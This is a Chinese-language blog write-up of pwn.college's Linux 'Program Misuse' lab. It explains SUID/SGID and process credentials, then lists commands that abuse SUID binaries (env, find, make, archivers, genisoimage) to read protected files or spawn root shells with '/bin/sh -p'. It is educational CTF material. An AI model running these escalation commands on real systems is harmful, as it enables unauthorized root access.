

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=dark>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="../../../../img/touxiang.png">
  <link rel="icon" href="../../../../img/touxiang.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="0P1N">
  <meta name="keywords" content="">
  
    <meta name="description" content="PwnCollege - Fundamentals -ProgramMisuse网址：https:&#x2F;&#x2F;pwn.college&#x2F; Using The Dojo  - the welcome  module访问靶机的三种方式:在Workspace的Vscode中打开终端、在Desktop中操作靶机桌面以及通过ssh连接至靶机。另外，靶机的&#x2F;home&#x2F;hacker目录是持久化的，也就">
<meta property="og:type" content="article">
<meta property="og:title" content="PwnCollege - Fundamentals - ProgramMisuse">
<meta property="og:url" content="https://lkliki.github.io/2024/02/05/PwnCollege-Fundamentals-ProgramMisuse/index.html">
<meta property="og:site_name" content="0P1N">
<meta property="og:description" content="PwnCollege - Fundamentals -ProgramMisuse网址：https:&#x2F;&#x2F;pwn.college&#x2F; Using The Dojo  - the welcome  module访问靶机的三种方式:在Workspace的Vscode中打开终端、在Desktop中操作靶机桌面以及通过ssh连接至靶机。另外，靶机的&#x2F;home&#x2F;hacker目录是持久化的，也就">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lkliki.github.io/2024/02/05/PwnCollege-Fundamentals-ProgramMisuse/1.jpg">
<meta property="og:image" content="https://lkliki.github.io/2024/02/05/PwnCollege-Fundamentals-ProgramMisuse/QQ%E6%88%AA%E5%9B%BE20240119205610.png">
<meta property="og:image" content="https://lkliki.github.io/2024/02/05/PwnCollege-Fundamentals-ProgramMisuse/QQ%E6%88%AA%E5%9B%BE20240121111515.png">
<meta property="og:image" content="https://lkliki.github.io/2024/02/05/PwnCollege-Fundamentals-ProgramMisuse/QQ%E6%88%AA%E5%9B%BE20240126012226.png">
<meta property="og:image" content="https://lkliki.github.io/2024/02/05/PwnCollege-Fundamentals-ProgramMisuse/QQ%E6%88%AA%E5%9B%BE20240126010806.png">
<meta property="article:published_time" content="2024-02-05T04:00:00.000Z">
<meta property="article:modified_time" content="2024-02-29T11:20:34.083Z">
<meta property="article:author" content="0P1N">
<meta property="article:tag" content="Pwn">
<meta property="article:tag" content="PwnCollege">
<meta property="article:tag" content="Linux权限提升">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://lkliki.github.io/2024/02/05/PwnCollege-Fundamentals-ProgramMisuse/1.jpg">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>PwnCollege - Fundamentals - ProgramMisuse - 0P1N</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="../../../../css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="../../../../css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="../../../../css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"lkliki.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="../../../../js/utils.js" ></script>
  <script  src="../../../../js/color-schema.js" ></script>
  

  

  

  

  

  

  

  



  
<meta name="generator" content="Hexo 6.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="../../../../index.html">
      <strong>Welcome To 0P1N&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../index.html">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('../../../../img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="PwnCollege - Fundamentals - ProgramMisuse"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-02-05 12:00" pubdate>
          2024年2月5日 中午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          14k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          117 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">PwnCollege - Fundamentals - ProgramMisuse</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="PwnCollege-Fundamentals-ProgramMisuse"><a href="#PwnCollege-Fundamentals-ProgramMisuse" class="headerlink" title="PwnCollege - Fundamentals -ProgramMisuse"></a>PwnCollege - Fundamentals -ProgramMisuse</h1><p>网址：<a target="_blank" rel="noopener" href="https://pwn.college/">https://pwn.college/</a></p>
<h2 id="Using-The-Dojo-the-welcome-module"><a href="#Using-The-Dojo-the-welcome-module" class="headerlink" title="Using The Dojo  - the welcome  module"></a>Using The Dojo  - the welcome  module</h2><p>访问靶机的三种方式:在Workspace的Vscode中打开终端、在Desktop中操作靶机桌面以及通过ssh连接至靶机。另外，靶机的&#x2F;home&#x2F;hacker目录是持久化的，也就是说每次开启新的挑战，&#x2F;home&#x2F;hacker目录不会被重置。</p>
<p>靶机分为两种模式：challenge和practice,在practice模式中有可调试的解决方案，但是flag是假flag。</p>
<p>ssh连接步骤：</p>
<p>1.运行<code>ssh-keygen -f key -N &#39;&#39;</code>命令，这会在当前目录下生成key和key.pub文件，分别是公钥和私钥。</p>
<p>2.<code>cat key.pub</code>打印key.pub文件内容。</p>
<p>3.将打印出的内容复制粘贴到Settings-&gt;SSH Key中。</p>
<p>4.<code>ssh -i key hacker@dojo.pwn.college</code>连接至靶机</p>
<p>Desktop中的复制粘贴:</p>
<p>打开剪切板，在网页虚拟机中选中的文字会直接被写入剪切板中，可以从剪切板中复制文字到本机;同理，要把外部的内容复制到虚拟机中只需将要复制的文字从本机复制到剪切板中，再在网页虚拟机中粘贴。</p>
<h2 id="Fundamentals-Program-Misuse"><a href="#Fundamentals-Program-Misuse" class="headerlink" title="Fundamentals - Program Misuse"></a>Fundamentals - Program Misuse</h2><h3 id="程序交互：Linux-命令行"><a href="#程序交互：Linux-命令行" class="headerlink" title="程序交互：Linux 命令行"></a>程序交互：Linux 命令行</h3><p>文件类型、文件查看、软连接和硬链接、inode</p>
<h3 id="程序滥用：权限提升-linux权限模型"><a href="#程序滥用：权限提升-linux权限模型" class="headerlink" title="程序滥用：权限提升 - linux权限模型"></a>程序滥用：权限提升 - linux权限模型</h3><p><a target="_blank" rel="noopener" href="https://gnu-linux.readthedocs.io/zh/latest/Chapter03/00_permission.html">参考</a></p>
<p>(1)用户和组信息</p>
<p>用户和组分别用 <code>UID</code> 和 <code>GID</code> 表示，一个用户可以同时属于多个组，默认每个用户必属于一个与之 UID 同值同名的 GID。</p>
<p>通过<code>id</code>命令可以查看用户的UID和GID。</p>
<p>系统保存用户信息的文件是 <code>/etc/passwd</code> ，保存组信息的文件是 <code>/etc/group</code> ，保存密码口令及其变动信息的文件是 <code>/etc/shadow</code> 。</p>
<p>(2)文件权限控制</p>
<p>文件的权限分为三组：U(所有者, Owner), G(用户组, Group), O(其他, Other），而每组又由三个权限位构成，分别为r(读权限), w(写权限), x(可执行权限)。 </p>
<p>通过 <code>ls -l</code> 可以查看到其文件类型及权限，通过 <code>chmod</code>修改权限，通过 <code>chown</code> 改变文件或目录的所属用户，通过 <code>chgrp</code> 改变文件或目录的所属组。</p>
<p><img src="/2024/02/05/PwnCollege-Fundamentals-ProgramMisuse/1.jpg" srcset="/img/loading.gif" lazyload alt="1"></p>
<p>虽然显示linux权限位是9位，但事实上linux权限位有12位，除了上述的9位外还有SUID，SGID和sticky位,其位置如下：</p>
<p>S G T r w x r w x r w x</p>
<p>例如<code>- rws r-x r--</code>对应的12位权限位的数值为100 111 101 100</p>
<p>SUID(set user id)和SGID(set group id)：</p>
<p>可通过<code>chmod u+s</code>和<code>chmod g+s</code>设置，只有具有对应可执行权限的<strong>可执行程序</strong>能够设置SUID和SGID，设置后x变为s。当对一个不具备 x 权限的文件设置 s 权限时无效，权限变为大写 S，表明 s 权限未生效。该类文件被执行后进程的有效id为文件拥有者&#x2F;组的id，而正常可执行文件执行后进程的有效id为执行者的用户&#x2F;组id。</p>
<p>Strick(粘滞位)：</p>
<p>一般对目录针对 others 设置，设置后在目录中只有属主和 root 有删除文件的权限，即用户只能删除自己为属主的文件（多用于共享目录中）。可通过<code>chmod +t</code>和<code>chmod -t</code>设置和删除，设置后others的x位显示为t，只有others有可执行权限的文件设置该位才有效(具有写和执行权限才能在目录下进行文件创建删除等操作)，others没有可执行权限的文件设置后其others的x位显示为T。</p>
<p>(3)进程权限控制</p>
<p>进程的id称为进程凭证，包括了真实用户id(read user id,ruid)和真实组id(read group id,rgid)，有效用户id(effective user id,euid)和有效组id(effective group id,egid)，设置用户id(saved set user id)和设置组id(saved set group id)，文件系统用户id(fsuid)和文件系统组id(fsgid)，辅助组id(Supplementary Group ID)。</p>
<p>注意：saved set-user-id是进程id，而set-user-id(suid)是文件的特殊权限，group id同理</p>
<ul>
<li><p><code>ruid</code> 和 <code>rgid</code>标识了该进程属于哪一个用户（哪一个组）。子进程的真实id继承自创建它的父进程，shell进程的真实id会在用户登陆时被login进程使用setuid等函数设置为用户的uid和gid。</p>
</li>
<li><p><code>euid</code>和<code>egid</code>用于决定进程对系统资源的访问权限（除了文件访问），操作系统对访问权限的验证依据的是有效id而不是真实id(但进程间signal发送会检查真实id或有效id是否匹配)。有效id为0的特权进程拥有所有权限(root)。一般进程的euid和egid复制自ruid和rgid，由具有suid和sgid的可执行文件生成的进程的euid和egid复制自可执行文件的所属用户id和所属组id。</p>
</li>
<li><p><code>saved set user id</code>和<code>saved set group id</code>。在进程被创建时直接复制自euid和egid，其作用是：存在真实id为非root，原始有效id为root的情况，保存原始有效id以便进程可以通过setuid使得有效id在真实id和原始有效id(root)之间切换。可以看下图中的例子，<a target="_blank" rel="noopener" href="https://www.cnblogs.com/alantu2018/p/8457458.html">来源</a>。</p>
</li>
</ul>
<p><img src="/2024/02/05/PwnCollege-Fundamentals-ProgramMisuse/QQ%E6%88%AA%E5%9B%BE20240119205610.png" srcset="/img/loading.gif" lazyload alt="2"></p>
<ul>
<li><p><code>fsuid</code>和<code>fsgid</code>。这两个ID是linux特有的，传统unix并没有这些ID。对于传统的unix，访问文件、发送signal，打开IPC的object等等的权限都是依据effective ID判断。对于linux，其余的权限仍然依据effective ID判断，但是对于文件的访问则使用file-system user ID 和 file-system group ID（配合supplementary group ID）。在不刻意使用系统调用<code>setfsuid</code>和<code>setfsgid</code>来设定文件系统id的情况下，文件系统id和有效id完全相同，如果通过系统调用修改有效ID，文件系统ID也会随之修改。事实上，该id是linux kernel早期版本为了NFS的安全问题引入的，kernel 2.0之后就应该被废弃了，但为了软件的兼容性，linux kernel仍然保留了这两个file-system ID。</p>
</li>
<li><p><code>Supplementary Group ID</code>是进程所属的额外组。创建进程的用户可能属于多个组，第一个组作为进程的gid，其余的保存在辅助组id中。一般进程从父进程中继承这些IDs。shell进程通过login进程从系统组文件（&#x2F;etc&#x2F;group）中获取辅助组IDs。</p>
</li>
</ul>
<p>操作系统通过如下方式确定进程访问文件的类别</p>
<ul>
<li>检查以及确认资源(文件)的所有权和组所有权</li>
<li>检查进程目前具有哪个访问类别(譬如，U|G|O)</li>
<li>针对相应的访问类别，相应的权限位是否设置(譬如 w设置为1，则允许写文件)</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> process_UID == file_UID<br> then<br>      access_category = U<br> <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> process_GID == file_GID<br> then<br>      access_category = G<br> <span class="hljs-keyword">else</span><br>      access_category = O<br> fi<br></code></pre></td></tr></table></figure>



<p>进程凭证的获取和修改</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">uid_t</span> <span class="hljs-title function_">getuid</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;    <span class="hljs-comment">//获取实际用户id</span><br><span class="hljs-type">uid_t</span> <span class="hljs-title function_">geteuid</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;   <span class="hljs-comment">//获取有效用户id</span><br><br><span class="hljs-type">gid_t</span> <span class="hljs-title function_">getgid</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;    <span class="hljs-comment">//获取实际组id</span><br><span class="hljs-type">gid_t</span> <span class="hljs-title function_">getegid</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;   <span class="hljs-comment">//获取有效组id</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">setuid</span><span class="hljs-params">(<span class="hljs-type">uid_t</span> uid)</span>;  <span class="hljs-comment">//设置实际用户id，有效用户id，保存用户id</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">setgid</span><span class="hljs-params">(<span class="hljs-type">gid_t</span> gid)</span>;  <span class="hljs-comment">//设置实际组id，实际有效组id，实际保存组id</span><br></code></pre></td></tr></table></figure>

<p>setuid系统调用的语法是 setuid(uid) ，其中，uid是新的用户ID，该系统调用的结果取决于有效用户ID的当前值。如果调用进程的有效用户ID是超级用户，内核会把进程表以及u区中的真实和有效用户ID都设置成uid。如果调用进程的有效用户ID不是超级用户，仅当uid等于真实用户ID或保存用户ID时，内核才会把u区中的有效用户ID设置成uid。否则，该系统调用将返回错误。一般来说，一个进程会在fork系统调用期间从父进程那儿继承它的真实和有效用户ID，这些数值即使经过exec系统调用也会保持不变。</p>
<p>1.当非特权进程调用setuid()时，只能修改进程的有效用户id，而且只能将有效用户id改成相应的实际用户id。<br>2.特权用户调用setuid()设置uid为非0时，会同时设置实际用户id，有效用户id，和保存设置用户id，且为单向的，因为设置了之后进程就失去了特权。</p>
<h3 id="程序滥用：缓解措施"><a href="#程序滥用：缓解措施" class="headerlink" title="程序滥用：缓解措施"></a>程序滥用：缓解措施</h3><p>例1：&#x2F;bin&#x2F;sh 命令注入缓解措施</p>
<p>如果&#x2F;bin&#x2F;sh在设置了suid的情况下运行导致ruid!&#x3D;0但euid&#x3D;&#x3D;0,那么会进行自动降权，使euid &#x3D; ruid。也就是说&#x2F;bin&#x2F;sh只有在ruid和euid都是0时才有root权限。可通过sh -p启动shell来关闭该特性。</p>
<p>例2：wireshark的协议解析部分存在较大的攻击面，如果以root身份运行该部分可能导致严重后果，因此作者将wireshark分成两部分，dumpcap和wireshark分别用来抓包和分析协议，只有dumpcap需要root权限。</p>
<p>通常我们使用沙箱来缓解程序滥用，使程序运行在无法接触到敏感数据和权限的环境中。</p>
<h3 id="challenges"><a href="#challenges" class="headerlink" title="challenges"></a>challenges</h3><p>给出一个有suid权限的程序，使用这个程序来读flag或<strong>提权</strong></p>
<p><strong>直接读取</strong></p>
<p>cat,more,less,tail,head,sort</p>
<p><strong>文本编辑器</strong></p>
<p>vim,emacs,nano</p>
<p>其中emacs会有如下报错：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">This process is currently running setuid or setgid.<br>This is not a supported use of GTK+. You must create a helper<br>program instead. For further details, see:<br><br>    http://www.gtk.org/setuid.html<br><br>Refusing to initialize GTK+.<br></code></pre></td></tr></table></figure>

<p>参考<a target="_blank" rel="noopener" href="https://www.gtk.org/setuid.html">这里</a>以及该<a target="_blank" rel="noopener" href="https://j-shiro.github.io/p/pwncollege_note1/">博客</a>，可以通过添加-nw参数解决，该参数的作用是使启动时不开启GUI界面。</p>
<p>报错原因：emacs默认指向emacs-gtk，在启动时自带GUI。而GTK的图形化接口易受攻击，开发者为了降低安全风险，禁止了普通用户运行设置了suid的emacs-gtk程序。</p>
<p><img src="/2024/02/05/PwnCollege-Fundamentals-ProgramMisuse/QQ%E6%88%AA%E5%9B%BE20240121111515.png" srcset="/img/loading.gif" lazyload alt="3"></p>
<p><strong>文本操作</strong></p>
<p>10.rev</p>
<p>对输入进行逆置，把输出再逆置一遍就行</p>
<p>11.od</p>
<p>参数如下，-c即可</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">-<span class="hljs-selector-tag">b</span>:octal		-x -h:hex<br>-c:ASCII		-d:<span class="hljs-built_in">Decimal</span>(ten)<br></code></pre></td></tr></table></figure>

<p>12.hd  - hexdump，直接查看即可</p>
<p>13.xxd - - 16进制查看器，直接查看即可</p>
<p>14.base32    把输出的加密flag用base32 -d解密即可</p>
<p>15.base64 同base32</p>
<p>16.split  用于分割数据，分割后的数据块保存在当前所在目录的不同文件中，文件名类似xaa,xab….</p>
<p><strong>文件压缩命令</strong></p>
<p>17.gzip</p>
<p>先压缩<code>gzip /flag</code>,flag文件压缩后变为flag.gz，再<code>gzip -d -c /flag.gz</code>，-d表示解压，-c表示直接输出结果</p>
<p>18.bzip2</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">/usr/bin/bzip2 -d -c /flag</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">/usr/bin/bzip2 -d -c /flag.bz2</span><br></code></pre></td></tr></table></figure>

<p>19.zip</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">zip /flag.zip /flag</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag.zip</span><br></code></pre></td></tr></table></figure>

<p>20.tar </p>
<ul>
<li>-c或–create 建立新的备份文件。</li>
<li>-f&lt;备份文件&gt;或–file&#x3D;&lt;备份文件&gt; 指定备份文件。</li>
<li>-x或–extract或–get 从备份文件中还原文件。</li>
<li>-O或–stdout 把从备份文件里还原的文件输出到标准输出设备。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tar -cf flag.tar.gz flag</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">tar -x -O -f flag.tar.gz</span><br></code></pre></td></tr></table></figure>

<p>21.ar</p>
<ul>
<li>-r 　将文件插入备存文件中。</li>
<li>v 　程序执行时显示详细的信息。</li>
<li>-p 　显示备存文件中的成员文件内容。</li>
<li>-x 　自备存文件中取出成员文件。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ar rv flag.bak /flag</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">ar -p flag.bak</span><br></code></pre></td></tr></table></figure>

<p>22.cpio</p>
<ul>
<li><p>-o或–create 　执行copy-out模式，建立备份档。</p>
</li>
<li><p>-i或–extract 　执行copy-in模式，还原备份档。</p>
</li>
</ul>
<p>输入<code>cpio -o</code>+回车后进入copy-out模式，输入<code>/flag</code>，再ctrl + d完成输入，输出的内容就是新建的备份档，其中包含flag，一般创建备份档时会将其重定向至.cpio文件中。</p>
<p>23.genisoimage<br>该命令用于创建ISO9660格式的光盘文件系统镜像</p>
<p><code>-sort FILE</code>参数用于对文件写入镜像的顺序进行排序，FILE文件用于描述排序时的文件名和对应的权重。当FILE的文件格式(文件名+权重)错误导致解析失败时，文件内容会被在错误消息中打印出来。</p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/genisoimage/">参考</a> <a target="_blank" rel="noopener" href="https://linux.die.net/man/1/genisoimage">genisoimage手册</a> <a target="_blank" rel="noopener" href="https://www.apt-browse.org/browse/debian/jessie/main/all/cdrkit-doc/9:1.1.11-3/file/usr/share/doc/cdrkit-doc/genisoimage/README.sort">README.sort</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">/usr/bin/genisoimage -<span class="hljs-built_in">sort</span> /flag</span><br></code></pre></td></tr></table></figure>



<p><strong>通过suid程序间接执行其它命令提权</strong></p>
<p>24.env </p>
<ul>
<li><p>直接运行显示系统的环境变量</p>
</li>
<li><p><code>env cmd</code>在当前环境下执行命令</p>
</li>
<li><p><code>env -u name </code>删除变量</p>
</li>
<li><p><code>env -i</code>开启一个新的空环境</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">env</span> /bin/sh -p</span><br></code></pre></td></tr></table></figure>



<p>25.find</p>
<p>用于在指定目录下查找文件和目录。可以使用不同的选项来过滤和限制查找的结果。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">find <span class="hljs-selector-attr">[路径]</span> <span class="hljs-selector-attr">[匹配条件]</span> <span class="hljs-selector-attr">[动作]</span><br></code></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find /bin/ -name &quot;sh&quot; -exec &#123;&#125; -p \; <br></code></pre></td></tr></table></figure>

<p>;代表命令结束，{}会被查找到的文件替代</p>
<p>26.make</p>
<p>自动化编译命令，根据makefile中的规则来 编译和构建程序。</p>
<ul>
<li><code>-f</code>指定特定的makefile，默认在当前目录下寻找makefile</li>
<li><code>-j</code>指定构建时使用的cpu核心数</li>
<li><code>make clean</code> 清除之前编译的可执行文件及配置文件。<code>make distclean</code> 清除所有生成的文件。</li>
<li><code>make install</code>将编译成功的可执行文件安装到系统目录中。</li>
<li><code>--eval string</code>在解析任何makefile之前将string作为makefile语句解析</li>
</ul>
<p>提权语句：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">make -s --eval=$&#x27;x:\n\t-&#x27;&quot;/bin/sh -p&quot;<br></code></pre></td></tr></table></figure>

<p>效果等同于编写如下的makefile文件后进行make</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">x:</span><br>	-/bin/sh -p<br></code></pre></td></tr></table></figure>

<p>这里x是目标文件，冒号后是编译x需要的依赖，这里没有需要的依赖，因为我们不编译，只执行提权命令。后面每个换行加缩进后是编译需要执行的命令,命令前加”-“表示如果该条命令报错，继续执行下面的命令。</p>
<p>更详细的例子：</p>
<p>helloworld函数的功能是打印”Hello World!”</p>
<p>a中实现helloworld函数的定义，b中声明后调用helloworld，a和b链接成文件x，最后执行x打印”Hello World!”并提权。</p>
<p>a.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">helloworld</span><span class="hljs-params">()</span>&#123;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello World!\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>b.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">helloworld</span><span class="hljs-params">()</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>	helloworld();<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>makefile</p>
